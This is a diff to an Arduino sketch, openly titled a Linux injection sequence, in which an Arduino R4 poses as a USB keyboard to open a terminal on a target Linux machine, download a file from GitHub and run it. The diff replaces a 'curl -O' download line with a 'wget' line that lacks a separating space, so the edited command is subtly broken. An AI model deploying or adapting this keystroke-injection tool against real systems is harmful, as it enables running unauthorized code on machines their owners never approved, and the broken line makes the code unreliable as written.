@@ -1,8 +1,5 @@
 /* 
-TODOs:
-- retest with new terminal shortcut attempts
-
-Linux injection sequence
+Linux Injection Sequence
 
 Uses an Arduino R4 to emulate an HID keyboard and inject keystroke commands to open a terminal, download a file from Github, 
 and run the file on the target Linux system.
@@ -62,7 +59,7 @@ void loop() {
     delay(500); // let animation play
 
     // Download file off of GitHub
-    Keyboard.print("curl -O " + download_url);
+    Keyboard.print("wget" + download_url);
     Keyboard.press(KEY_RETURN);
     Keyboard.releaseAll();
     delay(500); // let animation play, let file download
